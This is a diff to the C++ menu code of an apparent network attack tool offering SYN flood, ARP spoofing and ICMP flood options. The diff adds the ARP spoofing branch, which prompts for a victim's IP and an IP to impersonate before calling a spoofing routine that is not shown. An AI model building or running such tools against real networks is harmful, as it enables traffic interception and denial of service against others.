@@ -13,17 +13,17 @@ void Menu::printLogo(){
     // cool logo transition
     this->helper.clearScreen();
     std::cout << this->logo << std::endl;
-    sleep(1);
+    sleep(WAITING_TIME);
     this->helper.clearScreen();
     std::cout << this->logo2 << std::endl;
-    sleep(1);
+    sleep(WAITING_TIME);
     this->helper.clearScreen();
     std::cout << this->logo3 << std::endl;
-    sleep(1);
+    sleep(WAITING_TIME);
     this->helper.clearScreen();
     std::cout << this->logo4 << std::endl;
     std::cout << this->line << std::endl;
-    sleep(1);
+    sleep(WAITING_TIME);
 }
 
 void Menu::printMenu(){
@@ -66,8 +66,8 @@ void Menu::selectAttackType(){
         // Attack types
         std::cout << "\nSelect an attack type:" << std::endl;
         std::cout << "1. SYN Flood (different source ip's each packet)" << std::endl;
-        std::cout << "2. ICMP Ping Flood" << std::endl;
-        std::cout << "3. ARP Spoofing" << std::endl;
+        std::cout << "2. ARP Spoofing" << std::endl;
+        std::cout << "3. ICMP Ping Flood" << std::endl;
         std::cout << "4. Back to menu\n" << std::endl;
         std::cout << "Your choice: ";
 
@@ -98,6 +98,26 @@ void Menu::selectAttackType(){
                 break;
             }
             case 2: {
+                const char* iface;
+                std::cout << "Getting current device's interface..." << std::endl;
+                sleep(WAITING_TIME);
+                iface = helper.get_iface();
+                std::cout << "Your current interface is: " << iface << std::endl;
+
+                std::cout << "Input the target IP (Victim's IP): ";
+                std::string target_ip_str;
+                std::cin >> target_ip_str;
+                const char* target_ip = target_ip_str.c_str(); // Convert to const char*
+
+                std::cout << "Input the spoofed IP (Victim will think this is your IP): ";
+                std::string spoof_ip_str;
+                std::cin >> spoof_ip_str;
+                const char* spoof_ip = spoof_ip_str.c_str(); // Convert to const char*
+
+                // ARP spoofing
+                ARP arp_instance;
+                arp_instance.send_arp_spoof(iface, target_ip, spoof_ip);
+
                 break;
             }
             case 3: {
